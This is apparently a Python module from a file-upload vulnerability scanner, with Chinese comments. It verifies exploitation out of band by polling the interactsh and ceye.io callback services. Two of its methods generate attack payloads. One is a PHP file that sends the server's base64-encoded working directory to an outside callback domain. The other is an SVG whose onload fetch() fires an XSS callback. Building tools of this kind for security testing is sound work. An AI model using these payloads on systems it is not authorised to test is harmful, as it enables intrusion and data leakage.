#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OOB Verifier - 带外验证模块

两条路径：
  A. 用户填写 interactsh 或 ceye.io token → 轮询 API 确认是否收到回调
  B. 不填写 → 降级为 upload_dir 文件存在性验证（原有行为）

使用方式：
    verifier = OOBVerifier(platform="interactsh", token="xxx.oast.fun")
    token_str = verifier.generate_token()          # 嵌入 payload
    # 上传含 token_str 的 payload ...
    hit = await verifier.poll_async(token_str, timeout=15)
    if hit:
        print(f"确认执行！OOB 命中: {hit}")

Author: UploadRanger
"""

from __future__ import annotations

import asyncio
import hashlib
import random
import string
import time
from typing import Optional, Dict, Any

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

PLATFORM_INTERACTSH = "interactsh"
PLATFORM_CEYE       = "ceye"
PLATFORM_NONE       = "none"        # 降级模式，不做 OOB

_INTERACTSH_API = "https://interact.sh/api/v1/interactions/{id}"
_CEYE_API       = "http://api.ceye.io/v1/records?token={token}&type={type}"


# ---------------------------------------------------------------------------
# OOBVerifier
# ---------------------------------------------------------------------------

class OOBVerifier:
    """
    带外验证器。

    Args:
        platform:   "interactsh" | "ceye" | "none"
        token:      平台 token / 域名前缀（interactsh 用域名，ceye 用 API token）
        api_key:    ceye 专用的 identifier（http://ceye.io 右上角获取）
    """

    def __init__(
        self,
        platform: str = PLATFORM_NONE,
        token: str = "",
        api_key: str = "",
    ):
        self.platform = platform.lower().strip()
        self.token = token.strip()
        self.api_key = api_key.strip()
        self._pending: Dict[str, float] = {}   # token → 注册时间

    # ------------------------------------------------------------------
    # Token 生成
    # ------------------------------------------------------------------

    def generate_token(self, prefix: str = "ur") -> str:
        """
        生成唯一 token，用于嵌入 payload。

        返回值可直接插入文件名、路径、或文件内容中作为标记。
        例如：payload 中的 DNS 回调地址 = f"{token}.{self.domain}"
        """
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        tok = f"{prefix}-{rand}"
        self._pending[tok] = time.time()
        return tok

    def domain_for_token(self, token: str) -> str:
        """
        返回该 token 对应的 OOB 回调域名（用于 DNS / HTTP 回调 payload）。

        interactsh: {token}.{interact_domain}
        ceye:       {token}.{ceye_identifier}.ceye.io
        none:       空字符串
        """
        if self.platform == PLATFORM_INTERACTSH and self.token:
            return f"{token}.{self.token}"
        if self.platform == PLATFORM_CEYE and self.api_key:
            return f"{token}.{self.api_key}.ceye.io"
        return ""

    # ------------------------------------------------------------------
    # 轮询（同步）
    # ------------------------------------------------------------------

    def poll(self, token: str, timeout: int = 10, interval: float = 1.5) -> Optional[Dict[str, Any]]:
        """
        轮询 OOB 平台，检查 token 是否收到回调。

        Returns:
            命中记录 dict，或 None（未命中 / 降级模式）
        """
        if self.platform == PLATFORM_NONE or not self.token:
            return None

        deadline = time.time() + timeout
        while time.time() < deadline:
            hit = self._check_once(token)
            if hit:
                return hit
            time.sleep(interval)
        return None

    # ------------------------------------------------------------------
    # 轮询（异步）
    # ------------------------------------------------------------------

    async def poll_async(
        self,
        token: str,
        timeout: int = 10,
        interval: float = 1.5,
    ) -> Optional[Dict[str, Any]]:
        """异步轮询版本，适合在 async_scanner 中使用。"""
        if self.platform == PLATFORM_NONE or not self.token:
            return None

        deadline = asyncio.get_event_loop().time() + timeout
        while asyncio.get_event_loop().time() < deadline:
            loop = asyncio.get_running_loop()
            hit = await loop.run_in_executor(None, self._check_once, token)
            if hit:
                return hit
            await asyncio.sleep(interval)
        return None

    # ------------------------------------------------------------------
    # 内部：调用平台 API
    # ------------------------------------------------------------------

    def _check_once(self, token: str) -> Optional[Dict[str, Any]]:
        try:
            if self.platform == PLATFORM_INTERACTSH:
                return self._check_interactsh(token)
            if self.platform == PLATFORM_CEYE:
                return self._check_ceye(token)
        except Exception:
            pass
        return None

    def _check_interactsh(self, token: str) -> Optional[Dict[str, Any]]:
        """查询 interactsh API（HTTP GET）"""
        try:
            import urllib.request
            import json
            url = _INTERACTSH_API.format(id=self.token)
            req = urllib.request.Request(url, headers={"Authorization": self.api_key or ""})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                interactions = data.get("data") or []
                for item in interactions:
                    raw = str(item).lower()
                    if token.lower() in raw:
                        return {"platform": "interactsh", "token": token, "data": item}
        except Exception:
            pass
        return None

    def _check_ceye(self, token: str) -> Optional[Dict[str, Any]]:
        """查询 ceye.io API"""
        try:
            import urllib.request
            import json
            for rtype in ("dns", "http"):
                url = _CEYE_API.format(token=self.api_key, type=rtype)
                with urllib.request.urlopen(url, timeout=5) as resp:
                    data = json.loads(resp.read().decode())
                    records = (data.get("data") or {}).get("list") or []
                    for rec in records:
                        name = str(rec.get("name", "")).lower()
                        if token.lower() in name:
                            return {"platform": "ceye", "token": token, "type": rtype, "data": rec}
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------
    # 工具：生成含 OOB token 的 Payload 内容
    # ------------------------------------------------------------------

    def wrap_php_payload(self, token: str) -> bytes:
        """
        生成含 OOB HTTP 回调的 PHP payload（适合 RCE 确认）。
        如果无 OOB 配置，退回为标准测试 payload。
        """
        domain = self.domain_for_token(token)
        if domain:
            return (
                f"<?php $h=@file_get_contents('http://{domain}/?r='.base64_encode(getcwd()));"
                f" echo 'UR_OOB_{token}'; ?>"
            ).encode()
        return b"<?php echo 'UR_TEST_' . (23*2); ?>"

    def wrap_svg_payload(self, token: str) -> bytes:
        """生成含 OOB 回调的 SVG XSS payload。"""
        domain = self.domain_for_token(token)
        callback = f"http://{domain}/?xss={token}" if domain else "#"
        return (
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'onload="fetch(\'{callback}\')">'
            f'<rect width="100" height="100"/></svg>'
        ).encode()

    # ------------------------------------------------------------------
    # 状态
    # ------------------------------------------------------------------

    @property
    def is_configured(self) -> bool:
        """是否配置了 OOB 平台（非 none 且有 token）"""
        return self.platform != PLATFORM_NONE and bool(self.token)

    def __repr__(self) -> str:
        return f"OOBVerifier(platform={self.platform!r}, configured={self.is_configured})"


# ---------------------------------------------------------------------------
# 模块级工厂
# ---------------------------------------------------------------------------

def create_verifier(
    platform: str = PLATFORM_NONE,
    token: str = "",
    api_key: str = "",
) -> OOBVerifier:
    """工厂函数，方便直接调用。"""
    return OOBVerifier(platform=platform, token=token, api_key=api_key)
